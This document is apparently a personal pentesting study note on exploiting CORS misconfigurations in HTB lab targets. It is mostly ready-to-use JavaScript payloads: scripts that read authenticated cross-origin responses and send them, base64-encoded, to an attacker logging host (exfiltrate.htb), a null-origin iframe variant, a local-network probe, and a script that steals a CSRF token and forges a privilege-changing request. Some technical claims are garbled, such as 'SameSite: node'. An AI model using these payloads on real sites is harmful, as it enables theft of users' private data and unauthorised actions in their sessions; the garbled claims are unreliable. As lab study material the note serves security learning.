# Missconfigurations
CORS misconfiguration in an internal web application can enable an attacker to ex-filtrate information that is not publicly accessible.
Most attacks require that the Access-Control-Allow-Credentials header is set to true, thus resulting in authenticated requests in the victim's context and it will pass users credentials in cross origins(aka ex-filtration)

## Arbitrary Origin Reflection
This attack aims to bypass the Access-Control-Allow-Origin option with example wildcards(*). OBS: This attack works ONLY if `Access-Control-Allow-Credentials: true` is not in place.
How to identify?
Fetch the request with burpsuite and replace the the Origin header in the request to a bogus value such as **thisdoesnotexist.whatever.htb** and check if this domain is contained in the Access-Control-Allow-Origin response header. 
If it is, the web application suffers from this CORS misconfiguration.
```

<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://api.vulnerablesite.htb/data', true);
    xhr.withCredentials = true;
    xhr.onload = () => {
      location = 'http://exfiltrate.htb/log?data=' + btoa(xhr.response);
    };
    xhr.send();
</script>

```
## Improper Origin Whitelist
This attack is very similar to the one before where the Same-Origin policy checks all the allowed Origin before before allowing the access. If the control is poorly implemented then will be possible to bypass CORS and sucesfully
access data from an untrused source.
If we take for example that **api.cacca.com** checks that only subdomains of **.cacca.com** are allowed but if this is wrongly implemented then will let to bypass if the Origin finish with cacca.com for example.
To exploit this: same as the Arbitrary origin but here it might not be able to use your **VHOST(exploit.htb)** as is not allowed in the CORS list but if it ends with **exploitcacca.htb** then it might allow to pass the check.
## Trusted null origin
This is very similar to the first one aka Arbitrary origin where instead to use the wildcard(*) we can use the NULL value instead to perform the same action. This attack is very improbable but might happen...
To exploit this: we need to find all resources where the Origin: null is accepted and allowed, successfully bypassing the CORS control.
```

<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://api.vulnerablesite.htb/data', true);
    xhr.withCredentials = true;
    xhr.onload = () => {
      location = 'http://exfiltrate.htb/log?data=' + btoa(xhr.response);
    };
    xhr.send();
</script>"></iframe>

```
## Targeting the local network
This attack targets local resources that are accessible only internally example from the a private IP.
If we take as example an IP sitting on the **172.17.x.x** address where CORS have wildcard on the Origin(allow all the Origins) and Access-Control-Allow-Credentials is not implemented which doesn't need authentication then we could use
the following code to ex-filtrate data as soon the victim will open the request, this will happen if the victim will execute the code internally from the private IP.
```
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://172.16.0.2/data', true);
    xhr.onload = () => {
      location = 'http://exfiltrate.htb/log?data=' + btoa(xhr.response);
    };
    xhr.send();
</script>
```
We can improve this by targeting some elements of the HTML response(VERY useful if the server is clipping cause too big request):
```
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://api.vulnerablesite.htb/data', true);
    xhr.withCredentials = true;
    xhr.onload = () => {
      // parse the response
	  var doc = new DOMParser().parseFromString(xhr.response, 'text/html');

	  // exfiltrate only the interesting element
	  var msg = encodeURIComponent(doc.getElementById('secret').innerHTML);
      location = 'https://exfiltrate.htb/log?data=' + btoa(msg);
    };
    xhr.send();
</script>
```


# CORS Bypassing techniques
Here I will write-down some techniques that can be engaged to bypass CORS if Access-Control-Allow-Credentials is in place(then the cookie can be ex-filtrated aswell).

### Bypass CRSF Tokens
If we can bypass the Same-Origin policy due to a CORS misconfiguration, we can access the response of cross-origin requests we make. 
This allows us to make a cross-origin request to the endpoint that creates a valid CSRF token, read it, embed it into our state-changing cross-origin request, and send the state-changing cross-origin request with the valid CSRF token. 
Since all this happens in the victim's session, the CSRF token is valid even if properly checked and tied to the victim's user session.
To make this work the back-end need to answer with SameSite: node.
**To Exploit it:**

The CSRF token is sent in response to a GET request to the /profile.php endpoint. We can make the corresponding request, parse the response, and extract the CSRF token using JavaScript code similar to the following:
```
<script>
	// GET CSRF token
	var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://vulnerablesite.htb/profile.php', false);
    xhr.withCredentials = true;
    xhr.send();
    var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
	var csrftoken = encodeURIComponent(doc.getElementById('csrf').value);

	// do CSRF
    var csrf_req = new XMLHttpRequest();
    var params = `promote=htb-stdnt&csrf=${csrftoken}`;
    csrf_req.open('POST', 'https://vulnerablesite.htb/profile.php', false);
	csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    csrf_req.withCredentials = true;
    csrf_req.send(params);
</script>
```
REMEMBER all these exploit must be hosted on the victim side, not sure if it will work otherwise...
